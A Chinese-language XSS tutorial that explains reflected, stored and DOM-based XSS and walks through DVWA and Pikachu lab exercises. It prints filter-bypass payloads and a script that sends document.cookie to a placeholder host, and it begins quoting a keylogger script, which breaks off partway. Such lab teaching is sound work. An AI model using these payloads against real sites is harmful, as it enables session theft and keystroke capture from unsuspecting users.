<li>XSS 基本概念和原理</li>
<li>反射型、存储型、DOM型实战</li>
<li>XSS 钓鱼及盲打演示</li>
<li>XSS 平台搭建及 Cookie 获取</li>
<li>反射型 XSS(POST) 获取用户密码</li>
<li>XSS 钓鱼测试</li>
<li>XSS 获取键盘记录</li>
<li>XSS 盲打</li>
<li>BeEF XSS</li>
<li>XSS 防御绕过</li>
<li>XSS 绕过之 htmlspecialchars() 函数</li>
<li>XSS 安全防御</li>
</ul>
</div>
<div id="outline-container-h:5359444e-f7b8-4b28-afeb-913a907e2b50" class="outline-3">
<h3 id="h:5359444e-f7b8-4b28-afeb-913a907e2b50">XSS基本概念</h3>
<div class="outline-text-3" id="text-h:5359444e-f7b8-4b28-afeb-913a907e2b50">
<p>
跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意 <b>攻击者往Web页面里插入恶意JavaScript代码，当用户浏览该页面时，嵌入Web里面的JS代码会被执行，从而达到恶意攻击用户的目的</b> 。XSS攻击针对的是用户层面的攻击。
</p>

<p>
在Web页面上，有一种很常见的功能是：将用户输入的内容输出到页面上。但是如果这里输入的内容是一段经过构造的JS代码，提交之后再次访问这个页面时，用户就会获取该JS代码在浏览器端执行的结果。
</p>

<p>
通过构造其他相应的代码，攻击者可以执行更具危害的操作。
</p>
</div>
</div>
<div id="outline-container-h:41968a8c-3c2f-469f-9e90-af02ca330221" class="outline-3">
<h3 id="h:41968a8c-3c2f-469f-9e90-af02ca330221">XSS分类</h3>
<div class="outline-text-3" id="text-h:41968a8c-3c2f-469f-9e90-af02ca330221">
</div>
<div id="outline-container-h:8fd037e2-bb03-4484-9ccd-dff4aa5ec317" class="outline-4">
<h4 id="h:8fd037e2-bb03-4484-9ccd-dff4aa5ec317">反射型</h4>
<div class="outline-text-4" id="text-h:8fd037e2-bb03-4484-9ccd-dff4aa5ec317">
<p>
非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS主要是GET类型。
</p>


<figure id="orgde22b6e">
<img src="./images/Snipaste_2023-06-10_07-06-09.png" alt="Snipaste_2023-06-10_07-06-09.png" width="50%">

</figure>

<ol class="org-ol">
<li>黑客：发送带有 XSS 恶意脚本的链接</li>
<li>用户：用户点击了恶意链接，访问了目标服务器</li>
<li>正常服务器：网站将XSS同正常页面返回到用户浏览器</li>
<li>用户：用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求</li>
<li>黑客：黑客从自己搭建的恶意服务器中获取用户提交的信息</li>
</ol>
</div>
</div>
<div id="outline-container-h:02f22346-6572-48a9-9cdd-01a28923ed9d" class="outline-4">
<h4 id="h:02f22346-6572-48a9-9cdd-01a28923ed9d">存储型</h4>
<div class="outline-text-4" id="text-h:02f22346-6572-48a9-9cdd-01a28923ed9d">
<p>
持久型，常见的就是在博客留言板、反馈投诉、论坛评论，将恶意代码和正文都存入服务器的数据库。
每次访问都会触发恶意代码。 
</p>


<figure id="org12b33ec">
<img src="./images/Snipaste_2023-06-10_07-07-47.png" alt="Snipaste_2023-06-10_07-07-47.png" width="50%">

</figure>

<ol class="org-ol">
<li>黑客：黑客在目录服务器上构造XSS恶意脚本，保存在数据库中或其它媒介</li>
<li>用户：用户在网站登录状态下，访问了目标服务器，查看了存在恶意脚本的页面</li>
<li>正常服务器：网站将XSS同正常页面返回到用户浏览器</li>
<li>用户：用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求</li>
<li>黑客：黑客从自己搭建的恶意服务器中获取用户提交的信息</li>
</ol>
</div>
</div>
<div id="outline-container-h:09374e02-e4c4-4acf-8eb0-e4e3c18c5dd6" class="outline-4">
<h4 id="h:09374e02-e4c4-4acf-8eb0-e4e3c18c5dd6">DOM型</h4>
<div class="outline-text-4" id="text-h:09374e02-e4c4-4acf-8eb0-e4e3c18c5dd6">
<p>
在讲解DOM-XSS之前，先以图来说明到底什么是DOM：
</p>


<figure id="orgdb83b33">
<img src="./images/Snipaste_2023-06-10_07-09-09.png" alt="Snipaste_2023-06-10_07-09-09.png" width="50%">

</figure>

<p>
文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分。
</p>

<p>
DOM型XSS其实是一种特殊类型的反射型XSS，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，触发XSS靠的是浏览器的DOM解析，完全是客户端的事情。
</p>

<p>
DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。
</p>
</div>
</div>
</div>
<div id="outline-container-h:04861855-b2ab-4dac-80c1-494eb3944de0" class="outline-3">
<h3 id="h:04861855-b2ab-4dac-80c1-494eb3944de0">手工测试</h3>
<div class="outline-text-3" id="text-h:04861855-b2ab-4dac-80c1-494eb3944de0">
<p>
这里我们选取 <code>DVWA靶场</code> ，针对低、中、高3个等级进行手工测试
</p>
</div>
<div id="outline-container-h:f2f56282-8855-40c7-a908-ead701c44b53" class="outline-4">
<h4 id="h:f2f56282-8855-40c7-a908-ead701c44b53">反射型 XSS 测试</h4>
<div class="outline-text-4" id="text-h:f2f56282-8855-40c7-a908-ead701c44b53">
<p>
进入XSS (Reflected)页面
</p>
</div>
<div id="outline-container-h:322355b9-5f72-49f1-a931-7134d953c95c" class="outline-5">
<h5 id="h:322355b9-5f72-49f1-a931-7134d953c95c">Low</h5>
<div class="outline-text-5" id="text-h:322355b9-5f72-49f1-a931-7134d953c95c">
<p>
输入下方代码即可触发XSS
</p>

<div class="org-src-container">
<pre class="src src-javascript">&lt;script&gt;alert(1)&lt;/script&gt;
</pre>
</div>

<p>
除了script标签，事件句柄也可以执行js代码。
</p>

<p>
html事件句柄:
</p>

<p>
HTML 4.0 的新特性之一是有能力使 HTML 事件触发浏览器中的动作（action），比如当用户点击某个HTML 元素时启动一段 JavaScript。下面是一个属性列表，这些属性可插入 HTML 标签来定义事件动作。
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-right">

<col  class="org-right">

<col  class="org-right">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">属性</th>
<th scope="col" class="org-left">当以下情况发生时，出现此事件</th>
<th scope="col" class="org-right">FF</th>
<th scope="col" class="org-right">N</th>
<th scope="col" class="org-right">IE</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">onabort</td>
<td class="org-left">图像加载被中断</td>
<td class="org-right">1</td>
<td class="org-right">3</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onblur</td>
<td class="org-left">元素失去焦点</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onchange</td>
<td class="org-left">用户改变域的内容</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onclick</td>
<td class="org-left">鼠标点击某个对象</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">ondblclick</td>
<td class="org-left">鼠标双击某个对象</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onerror</td>
<td class="org-left">当加载文档或图像时发生某个错误</td>
<td class="org-right">1</td>
<td class="org-right">3</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onfocus</td>
<td class="org-left">元素获得焦点</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onkeydown</td>
<td class="org-left">某个键盘的键被按下</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onkeypress</td>
<td class="org-left">某个键盘的键被按下或按住</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onkeyup</td>
<td class="org-left">某个键盘的键被松开</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onload</td>
<td class="org-left">某个页面或图像被完成加载</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onmousedown</td>
<td class="org-left">某个鼠标按键被按下</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onmousemove</td>
<td class="org-left">鼠标被移动</td>
<td class="org-right">1</td>
<td class="org-right">6</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onmouseout</td>
<td class="org-left">鼠标从某元素移开</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onmouseover</td>
<td class="org-left">鼠标被移到某元素之上</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onmouseup</td>
<td class="org-left">某个鼠标按键被松开</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onreset</td>
<td class="org-left">重置按钮被点击</td>
<td class="org-right">1</td>
<td class="org-right">3</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onresize</td>
<td class="org-left">窗口或框架被调整尺寸</td>
<td class="org-right">1</td>
<td class="org-right">4</td>
<td class="org-right">4</td>
</tr>

<tr>
<td class="org-left">onselect</td>
<td class="org-left">文本被选定</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onsubmit</td>
<td class="org-left">提交按钮被点击</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-left">onunload</td>
<td class="org-left">用户退出页面</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
<td class="org-right">3</td>
</tr>
</tbody>
</table>

<p>
说明：
</p>
<ul class="org-ul">
<li>FF，N，IE: 代表不同的浏览器</li>
<li>1 3 4：代表支持的最低的版本号</li>
</ul>

<p>
img标签支持onerror事件，在装载文档或图像的过程中如果发生了错误，就会触发onerror事件。想要在某个标签中运用事件，先去查询一下该标签是否支持对应事件。
</p>

<div class="org-src-container">
<pre class="src src-javascript">&lt;img src=## onerror=alert(document.cookie)&gt;
</pre>
</div>


<figure id="orga8edea4">
<img src="./images/Snipaste_2023-06-10_07-12-21.png" alt="Snipaste_2023-06-10_07-12-21.png" width="50%">

</figure>


<p>
a标签支持onmouseover事件，需要鼠标移动到 a 标签的位置才能触发
</p>

<div class="org-src-container">
<pre class="src src-javascript">&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
</pre>
</div>



<figure id="org2c44c0f">
<img src="./images/Snipaste_2023-06-10_07-13-38.png" alt="Snipaste_2023-06-10_07-13-38.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:d3198962-a915-48a8-8945-39da806e36d9" class="outline-5">
<h5 id="h:d3198962-a915-48a8-8945-39da806e36d9">DOM XSS</h5>
<div class="outline-text-5" id="text-h:d3198962-a915-48a8-8945-39da806e36d9">
<p>
反弹cookie
</p>
<div class="org-src-container">
<pre class="src src-javascript">&lt;script&gt;<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">img</span>=document.createElement(<span style="color: #8b2252;">"img"</span>);img.src=alert(document.cookie);&lt;/script&gt;
</pre>
</div>

<p>
发送cookie到远程服务器
</p>

<div class="org-src-container">
<pre class="src src-javascript">&lt;script&gt;<span style="color: #a020f0;">var</span>
img=document.createElement(<span style="color: #8b2252;">"img"</span>);img.src=<span style="color: #8b2252;">"http://xxxx/a?"</span>+escape(document.cookie);
&lt;/script&gt;

<span style="color: #b22222;">// </span><span style="color: #b22222;">escape&#20989;&#25968;&#65292;&#29983;&#25104;&#26032;&#30340;&#30001;&#21313;&#20845;&#36827;&#21046;&#36716;&#20041;&#24207;&#21015;&#26367;&#25442;&#30340;&#23383;&#31526;&#20018;&#12290;&#21487;&#20197;&#20351;&#29992;encodeURI&#20989;&#25968;&#26367;&#25442;</span>
</pre>
</div>


<figure id="orgc3ff8e8">
<img src="./images/Snipaste_2023-06-10_07-14-47.png" alt="Snipaste_2023-06-10_07-14-47.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:eb3b336b-d209-4c25-8208-84dee9083b8c" class="outline-5">
<h5 id="h:eb3b336b-d209-4c25-8208-84dee9083b8c">Medium</h5>
<div class="outline-text-5" id="text-h:eb3b336b-d209-4c25-8208-84dee9083b8c">
<p>
先观察一下代码，XSS (Reflected) Source
</p>

<div class="org-src-container">
<pre class="src src-sh"> &lt;?php

// Is there any input?
<span style="color: #a020f0;">if</span>( array_key_exists( <span style="color: #8b2252;">"name"</span>, $<span style="color: #a0522d;">_GET</span> ) &amp;&amp; $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'name'</span> ] != NULL ) {
    // Get input
    $<span style="color: #a0522d;">name</span> = str_replace( <span style="color: #8b2252;">'&lt;script&gt;'</span>, <span style="color: #8b2252;">''</span>, $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'name'</span> ] );

    // Feedback for end user
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span>;
}
?&gt;
</pre>
</div>

<p>
发现&lt;script&gt;标签被过滤了，尝试使用大小写混淆或者双写绕过:
</p>
<div class="org-src-container">
<pre class="src src-sh">&#22823;&#23567;&#20889;&#28151;&#28102;&#65306;&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;
&#21452;&#20889;&#32469;&#36807;&#65306;&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;
&#20854;&#20182;&#26631;&#31614;&#65306;
&lt;img <span style="color: #a0522d;">src</span>=x <span style="color: #a0522d;">OnerrOr</span>=alert(/xss/)&gt;
&lt;a <span style="color: #a0522d;">onmouseover</span>=alert(/xss/)&gt;xxs link&lt;/a&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ee79086c-bbff-42c8-aacf-682344b8547c" class="outline-5">
<h5 id="h:ee79086c-bbff-42c8-aacf-682344b8547c">High</h5>
<div class="outline-text-5" id="text-h:ee79086c-bbff-42c8-aacf-682344b8547c">
<p>
先观察一下代码，XSS (Reflected) Source
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php

// Is there any input?
<span style="color: #a020f0;">if</span>( array_key_exists( <span style="color: #8b2252;">"name"</span>, $<span style="color: #a0522d;">_GET</span> ) &amp;&amp; $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'name'</span> ] != NULL ) {
    // Get input
    $<span style="color: #a0522d;">name</span> = preg_replace( <span style="color: #8b2252;">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span style="color: #8b2252;">''</span>, $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'name'</span> ] );

    // Feedback for end user
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Hello ${name}&lt;/pre&gt;"</span>;
}

?&gt; 
</pre>
</div>
<p>
正则过滤了 &lt;script &lt;scrScripTipt 等包含&lt;script标签的数据。
</p>

<p>
在线正则表达式：<a href="https://c.runoob.com/front-end/854/">https://c.runoob.com/front-end/854/</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20351;&#29992;&#20854;&#20182;&#26631;&#31614;&#65306;
&lt;img <span style="color: #a0522d;">src</span>=x <span style="color: #a0522d;">OnerrOr</span>=alert(/xss/)&gt;
&lt;a <span style="color: #a0522d;">onmouseover</span>=alert(/xss/)&gt;xxs link&lt;/a&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:bff4e91f-d062-4752-b8a6-04fceba903dc" class="outline-4">
<h4 id="h:bff4e91f-d062-4752-b8a6-04fceba903dc">存储型 XSS 测试</h4>
<div class="outline-text-4" id="text-h:bff4e91f-d062-4752-b8a6-04fceba903dc">
<p>
进入 XSS (Stored) 页面
</p>
</div>
<div id="outline-container-h:8d97e3b5-fc98-46ff-aac7-38eea1373c8c" class="outline-5">
<h5 id="h:8d97e3b5-fc98-46ff-aac7-38eea1373c8c">Low</h5>
<div class="outline-text-5" id="text-h:8d97e3b5-fc98-46ff-aac7-38eea1373c8c">
<p>
填写下面信息。验证：切换一个页面再回来还会触发。
</p>
<div class="org-src-container">
<pre class="src src-javascript">name: 1
Message: &lt;script&gt;alert(1)&lt;/script&gt;

#&#20063;&#21487;&#20197;&#29992;&#20107;&#20214;
&lt;img src=## onerror=alert(document.cookie)&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:68c481af-2150-494f-907a-a6346dfa2501" class="outline-5">
<h5 id="h:68c481af-2150-494f-907a-a6346dfa2501">Medium</h5>
<div class="outline-text-5" id="text-h:68c481af-2150-494f-907a-a6346dfa2501">
<div class="org-src-container">
<pre class="src src-sh"> &lt;?php

<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'btnSign'</span> ] ) ) {
    // Get input
    $<span style="color: #a0522d;">message</span> = trim( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'mtxMessage'</span> ] );
    $<span style="color: #a0522d;">name</span>    = trim( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'txtName'</span> ] );

    // Sanitize message input
    $<span style="color: #a0522d;">message</span> = strip_tags( addslashes( $<span style="color: #a0522d;">message</span> ) );
    $<span style="color: #a0522d;">message</span> = ((isset($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]) &amp;&amp; is_object($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>],  $<span style="color: #a0522d;">message</span> ) : ((trigger_error(<span style="color: #8b2252;">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span style="color: #8b2252;">""</span> : <span style="color: #8b2252;">""</span>));
    $<span style="color: #a0522d;">message</span> = htmlspecialchars( $<span style="color: #a0522d;">message</span> );

    // Sanitize name input
    $<span style="color: #a0522d;">name</span> = str_replace( <span style="color: #8b2252;">'&lt;script&gt;'</span>, <span style="color: #8b2252;">''</span>, $<span style="color: #a0522d;">name</span> );
    $<span style="color: #a0522d;">name</span> = ((isset($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]) &amp;&amp; is_object($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>],  $<span style="color: #a0522d;">name</span> ) : ((trigger_error(<span style="color: #8b2252;">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span style="color: #8b2252;">""</span> : <span style="color: #8b2252;">""</span>));

    // Update database
    $<span style="color: #a0522d;">query</span>  = <span style="color: #8b2252;">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
    $<span style="color: #a0522d;">result</span> = mysqli_query($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>],  $<span style="color: #a0522d;">query</span> ) or die( <span style="color: #8b2252;">'&lt;pre&gt;'</span> . ((is_object($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>])) ? mysqli_error($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]) : (($<span style="color: #a0522d;">___mysqli_res</span> = mysqli_connect_error()) ? $<span style="color: #a0522d;">___mysqli_res</span> : false)) <span style="color: #483d8b;">.</span> <span style="color: #8b2252;">'&lt;/pre&gt;'</span> );

    //mysql_close();
}

?&gt;
</pre>
</div>
<p>
分析发现先是判断是否为空，如果不为空再判断其中的内容如果有 &lt;script&gt; 就替换成空，复写就可以绕过
</p>

<div class="org-src-container">
<pre class="src src-javascript">&lt;sc&lt;script&gt;ript&gt;alert(document.cookie)&lt;/script&gt;
</pre>
</div>

<p>
发现在message框把所有的特殊字符都进行了addslashes转义，在name框仍然可以用复写绕过，但是name处限制了长度：
</p>

<ul class="org-ul">
<li>addslashes()函数返回在预定义字符之前添加反斜杠的字符串</li>
<li>预定义字符是： 空格 单引号(')  双引号(")  反斜杠(\) NULL</li>
</ul>


<figure id="orga86eae3">
<img src="./images/Snipaste_2023-06-10_07-21-00.png" alt="Snipaste_2023-06-10_07-21-00.png" width="50%">

</figure>

<p>
页面中name有长度限制, 绕过方法：
</p>

<p>
1.可以使用burpsuite抓包修改
</p>


<figure id="org1d3bd4c">
<img src="./images/Snipaste_2023-06-10_07-21-45.png" alt="Snipaste_2023-06-10_07-21-45.png" width="50%">

</figure>

<p>
2.鼠标选中form表单后右键选择检查，直接修改前端代码的 maxlength ，之后就可以正常输入了，我这里修改为 1000
</p>



<figure id="org3c8f765">
<img src="./images/Snipaste_2023-06-10_07-22-35.png" alt="Snipaste_2023-06-10_07-22-35.png" width="50%">

</figure>


<figure id="org29315be">
<img src="./images/Snipaste_2023-06-10_07-23-06.png" alt="Snipaste_2023-06-10_07-23-06.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:666a44a2-d1e2-426b-83c6-f592911d19c9" class="outline-5">
<h5 id="h:666a44a2-d1e2-426b-83c6-f592911d19c9">High</h5>
<div class="outline-text-5" id="text-h:666a44a2-d1e2-426b-83c6-f592911d19c9">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php

<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'btnSign'</span> ] ) ) {
    // Get input
    $<span style="color: #a0522d;">message</span> = trim( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'mtxMessage'</span> ] );
    $<span style="color: #a0522d;">name</span>    = trim( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'txtName'</span> ] );

    // Sanitize message input
    $<span style="color: #a0522d;">message</span> = strip_tags( addslashes( $<span style="color: #a0522d;">message</span> ) );
    $<span style="color: #a0522d;">message</span> = ((isset($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]) &amp;&amp; is_object($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>],  $<span style="color: #a0522d;">message</span> ) : ((trigger_error(<span style="color: #8b2252;">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span style="color: #8b2252;">""</span> : <span style="color: #8b2252;">""</span>));
    $<span style="color: #a0522d;">message</span> = htmlspecialchars( $<span style="color: #a0522d;">message</span> );

    // Sanitize name input
    $<span style="color: #a0522d;">name</span> = preg_replace( <span style="color: #8b2252;">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span style="color: #8b2252;">''</span>, $<span style="color: #a0522d;">name</span> );
    $<span style="color: #a0522d;">name</span> = ((isset($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]) &amp;&amp; is_object($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>],  $<span style="color: #a0522d;">name</span> ) : ((trigger_error(<span style="color: #8b2252;">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span style="color: #8b2252;">""</span> : <span style="color: #8b2252;">""</span>));

    // Update database
    $<span style="color: #a0522d;">query</span>  = <span style="color: #8b2252;">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
    $<span style="color: #a0522d;">result</span> = mysqli_query($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>],  $<span style="color: #a0522d;">query</span> ) or die( <span style="color: #8b2252;">'&lt;pre&gt;'</span> . ((is_object($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>])) ? mysqli_error($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]) : (($<span style="color: #a0522d;">___mysqli_res</span> = mysqli_connect_error()) ? $<span style="color: #a0522d;">___mysqli_res</span> : false)) <span style="color: #483d8b;">.</span> <span style="color: #8b2252;">'&lt;/pre&gt;'</span> );

    //mysql_close();
}

?&gt; 
</pre>
</div>


<p>
可以发现name使用正则表达式，限制使用 script 标签，我们使用之前的 img 标签就可以绕过
</p>
<div class="org-src-container">
<pre class="src src-javascript">&lt;img src=## onerror=alert(document.cookie)&gt;
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:0c741e3e-bbeb-4f50-9aa3-485e7ce9e706" class="outline-3">
<h3 id="h:0c741e3e-bbeb-4f50-9aa3-485e7ce9e706">XSS盲打</h3>
<div class="outline-text-3" id="text-h:0c741e3e-bbeb-4f50-9aa3-485e7ce9e706">
<p>
XSS盲打是一种攻击场景，也是属于存储型XSS类型。
</p>

<p>
盲打的意思是无法直接在前端看到反馈效果，只有后台能看到输入的内容，从前端无法判断是否存在XSS，这种情况下，我们直接往里面插入XSS代码，然后等待，当管理员查看时就会遭到xss攻击。
</p>

<p>
Pikachu安装
</p>

<div class="org-src-container">
<pre class="src src-sh">docker pull area39/pikachu
docker run -d --name pikachu -p 8083:80 -p 33063:3306 area39/pikachu
</pre>
</div>

<p>
选择Cross-Site Scripting &#x2013;&gt; xss之盲打，输入常规的payload，点击提交
</p>

<div class="org-src-container">
<pre class="src src-javascript">&lt;script&gt;alert(<span style="color: #8b2252;">/xss/</span>)&lt;/script&gt;
</pre>
</div>


<figure id="org23437b2">
<img src="./images/Snipaste_2023-06-10_07-26-07.png" alt="Snipaste_2023-06-10_07-26-07.png" width="50%">

</figure>

<p>
提交后发现这里提示一段文字，应该是直接打到后台了。点击右上角提示，找到后台，管理员登录进去看看。 admin/123456
</p>


<figure id="org5f9d750">
<img src="./images/Snipaste_2023-06-10_07-26-51.png" alt="Snipaste_2023-06-10_07-26-51.png" width="50%">

</figure>

<p>
后台地址是 <a href="http://your_ip/vul/xss/xssblind/admin_login.php">http://your_ip/vul/xss/xssblind/admin_login.php</a> ，根据用户名/密码进行登录，即可触发xss
</p>


<figure id="orgbc5f6be">
<img src="./images/Snipaste_2023-06-10_07-28-12.png" alt="Snipaste_2023-06-10_07-28-12.png" width="50%">

</figure>



<figure id="orgb800c8b">
<img src="./images/Snipaste_2023-06-10_07-28-42.png" alt="Snipaste_2023-06-10_07-28-42.png" width="50%">

</figure>

<p>
很多时候，我们可能通用burpsuite抓包，根据响应来判断是否有问题，如把请求放到repeater中不判断尝试，搜索响应中是否有我们想要的。
</p>
</div>
</div>
<div id="outline-container-h:2a0c68b8-4a3f-4a9a-b842-063731dcdf71" class="outline-3">
<h3 id="h:2a0c68b8-4a3f-4a9a-b842-063731dcdf71">XSS键盘记录</h3>
<div class="outline-text-3" id="text-h:2a0c68b8-4a3f-4a9a-b842-063731dcdf71">
<p>
查看pikachu自带XSS键盘记录利用脚本 /var/www/html/pkxss/rkeypress/rk.js
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">/*</span><span style="color: #b22222;">'</span>
<span style="color: #b22222;"> * Created by runner on 2018/7/8.</span>
<span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">createAjax</span>() {
    <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">request</span> = <span style="color: #008b8b;">false</span>;
    <span style="color: #a020f0;">if</span> (window.XMLHttpRequest) {
        request = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">XMLHttpRequest</span>();
        <span style="color: #a020f0;">if</span> (request.overrideMimeType) {
            request.overrideMimeType(<span style="color: #8b2252;">"text/xml"</span>);
        }
    } <span style="color: #a020f0;">else</span> <span style="color: #a020f0;">if</span> (window.ActiveXObject) {
        <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">versions</span> = [<span style="color: #8b2252;">'Microsoft.XMLHTTP'</span>, <span style="color: #8b2252;">'MSXML.XMLHTTP'</span>,
            <span style="color: #8b2252;">'Msxml2.XMLHTTP.7.0'</span>, <span style="color: #8b2252;">'Msxml2.XMLHTTP.6.0'</span>,
            <span style="color: #8b2252;">'Msxml2.XMLHTTP.5.0'</span>,
            <span style="color: #8b2252;">'Msxml2.XMLHTTP.4.0'</span>, <span style="color: #8b2252;">'MSXML2.XMLHTTP.3.0'</span>, <span style="color: #8b2252;">'MSXML2.XMLHTTP'</span>
        ];
